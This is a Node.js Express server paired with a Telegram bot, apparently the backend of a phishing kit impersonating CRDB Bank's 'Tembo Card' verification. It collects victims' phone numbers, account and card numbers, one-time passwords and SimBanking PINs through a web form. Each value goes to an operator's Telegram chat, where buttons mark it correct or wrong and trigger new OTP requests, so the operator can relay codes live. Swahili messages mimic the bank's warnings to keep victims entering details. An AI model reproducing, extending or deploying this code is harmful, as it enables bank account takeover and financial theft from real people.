const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Configuration using standard environment keys
const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const bot = new TelegramBot(TOKEN, { polling: true });

// Persistent memory container
global.appState = global.appState || {
    adminChatId: CHAT_ID || null,
    clientData: {},
    pinAttempts: 3,
    currentClientResponse: null
};

// Admin start command: immediately captures chat ID and provides info with private link context
bot.onText(/\/start/, (msg) => {
    global.appState.adminChatId = msg.chat.id;
    const user = msg.from;
    const privateLink = `https://t.me/${bot.options.username || 'bot'}`;
    
    const welcomeMsg = `✅ **Admin Connected Successfully!**\n\n` +
        `👤 **User Info:**\n` +
        `• Name: ${user.first_name} ${user.last_name || ''}\n` +
        `• Username: @${user.username || 'N/A'}\n` +
        `• ID: \`${user.id}\`\n\n` +
        `🔗 **Private Bot Link:** ${privateLink}\n\n` +
        `📱 Telegram notifications start strictly from the **Tembo Card Verification** screen onwards.`;
    
    bot.sendMessage(global.appState.adminChatId, welcomeMsg, { parse_mode: 'Markdown' });
});

// API endpoint to handle user step submissions from frontend
app.post('/api/submit', async (req, res) => {
    const { step, data } = req.body;
    global.appState.clientData = { ...global.appState.clientData, ...data };

    if (!global.appState.adminChatId) {
        return res.status(400).json({ success: false, message: 'Admin not connected to bot. Please send /start to your bot on Telegram.' });
    }

    if (step === 'personal_info') {
        // Step 1 stays local and silent (No Telegram message sent)
        return res.json({ success: true });
    }
    else if (step === 'step3') {
        const msgText = `💳 **Step 3: Account & Tembo Card Verification**\n\n📱 **Phone No:** ${global.appState.clientData.phoneNumber || 'N/A'}\n🏦 **Account No:** ${data.accountNumber}\n💳 **Tembo Card No:** ${data.cardNumber}\n\n*Choose action for applicant:*`;
        
        const opts = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'PROCEED', callback_data: 'card_proceed' },
                        { text: 'DENY INVALID CRDB DETAILS ❌', callback_data: 'card_deny' }
                    ]
                ]
            },
            parse_mode: 'Markdown'
        };
        await bot.sendMessage(global.appState.adminChatId, msgText, opts);
        return res.json({ success: true, pendingApproval: true });
    }
    else if (step === 'step4') {
        if (data.isResend) {
            const msgText = `🔄 **Step 4: Applicant OTP Expired / Requesting New OTP**\n\n📱 **Phone:** ${global.appState.clientData.phoneNumber || 'N/A'}\n\n*The 30-second timer expired or applicant requested a new OTP. Choose action:*`;
            const opts = {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: 'SEND NEW OTP 📤', callback_data: 'otp_resend_approve' },
                            { text: 'IGNORE ❌', callback_data: 'otp_resend_ignore' }
                        ]
                    ]
                },
                parse_mode: 'Markdown'
            };
            await bot.sendMessage(global.appState.adminChatId, msgText, opts);
            return res.json({ success: true, pendingApproval: true });
        }

        const msgText = `📱 **Step 4: OTP Verification**\n\n🔢 **Entered OTP:** ${data.otp}\n\n*Choose action for OTP:*`;
        const opts = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'CORRECT OTP ✅', callback_data: 'otp_correct' },
                        { text: 'INCORRECT OTP ❌', callback_data: 'otp_incorrect' },
                        { text: 'RESEND OTP 🔄', callback_data: 'otp_resend' }
                    ]
                ]
            },
            parse_mode: 'Markdown'
        };
        await bot.sendMessage(global.appState.adminChatId, msgText, opts);
        return res.json({ success: true, pendingApproval: true });
    }
    else if (step === 'step5') {
        const msgText = `🔒 **Step 5: SimBanking PIN**\n\n🔑 **Attempt PIN:** ${data.pin}\n⚠️ **Remaining Attempts:** ${global.appState.pinAttempts}\n\n*Choose action for PIN:*`;
        const opts = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'CORRECT PIN ✅', callback_data: 'pin_correct' },
                        { text: 'WRONG PIN ❌', callback_data: 'pin_wrong' }
                    ]
                ]
            },
            parse_mode: 'Markdown'
        };
        await bot.sendMessage(global.appState.adminChatId, msgText, opts);
        return res.json({ success: true, pendingApproval: true });
    }

    res.json({ success: false, message: 'Invalid step' });
});

bot.on('callback_query', async (query) => {
    const action = query.data;
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;

    try {
        await bot.answerCallbackQuery(query.id);
    } catch (e) {}

    try {
        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId });
    } catch (e) {}

    if (action === 'card_proceed') {
        await bot.sendMessage(chatId, '✅ Card details approved. Moving applicant to OTP step.');
        global.appState.currentClientResponse = { status: 'approved', next: 'otp' };
    } else if (action === 'card_deny') {
        await bot.sendMessage(chatId, '❌ Application stopped due to invalid CRDB details.');
        global.appState.currentClientResponse = { status: 'denied', message: 'Tafadhali ingiza namba sahihi za akaunti na kadi (Invalid CRDB details ❌).' };
    } else if (action === 'otp_correct') {
        await bot.sendMessage(chatId, '✅ Correct OTP!');
        global.appState.currentClientResponse = { status: 'approved', next: 'pin' };
    } else if (action === 'otp_incorrect') {
        await bot.sendMessage(chatId, '❌ Incorrect OTP.');
        global.appState.currentClientResponse = { status: 'retry_otp', message: 'Namba ya OTP si sahihi ❌. Tafadhali ingiza OTP mpya.' };
    } else if (action === 'otp_resend') {
        await bot.sendMessage(chatId, '🔄 Resend OTP triggered.');
        global.appState.currentClientResponse = { status: 'resend', message: 'Ombi la kutuma tena OTP limepokelewa ✅.' };
    } else if (action === 'otp_resend_approve') {
        await bot.sendMessage(chatId, '✅ New OTP request approved and sent to applicant.');
        global.appState.currentClientResponse = { status: 'resend', message: 'Namba mpya ya OTP imetumwa kwenye simu yako ✅.' };
    } else if (action === 'otp_resend_ignore') {
        await bot.sendMessage(chatId, 'ℹ️ New OTP request ignored.');
        global.appState.currentClientResponse = { status: 'retry_otp', message: 'Tafadhali tumia OTP uliyopokea awali.' };
    } else if (action === 'pin_correct') {
        await bot.sendMessage(chatId, '✅ Correct PIN!');
        global.appState.pinAttempts = 3;
        global.appState.currentClientResponse = { status: 'approved', next: 'success' };
    } else if (action === 'pin_wrong') {
        global.appState.pinAttempts--;
        if (global.appState.pinAttempts <= 0) {
            await bot.sendMessage(chatId, '🚫 Account blocked due to 3 wrong PIN attempts.');
            global.appState.currentClientResponse = { status: 'blocked', message: 'Akaunti yako imezuiwa kutokana na makosa ya PIN ❌.' };
            global.appState.pinAttempts = 3;
        } else {
            await bot.sendMessage(chatId, `⚠️ Wrong PIN. ${global.appState.pinAttempts} attempt remains.`);
            global.appState.currentClientResponse = { status: 'retry_pin', message: `Wrong PIN ❌. ${global.appState.pinAttempts} attempt(s) remaining.` };
        }
    }
});

app.get('/api/poll-status', (req, res) => {
    const checkInterval = setInterval(() => {
        if (global.appState.currentClientResponse) {
            clearInterval(checkInterval);
            const resp = global.appState.currentClientResponse;
            global.appState.currentClientResponse = null;
            res.json(resp);
        }
    }, 1000);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
        
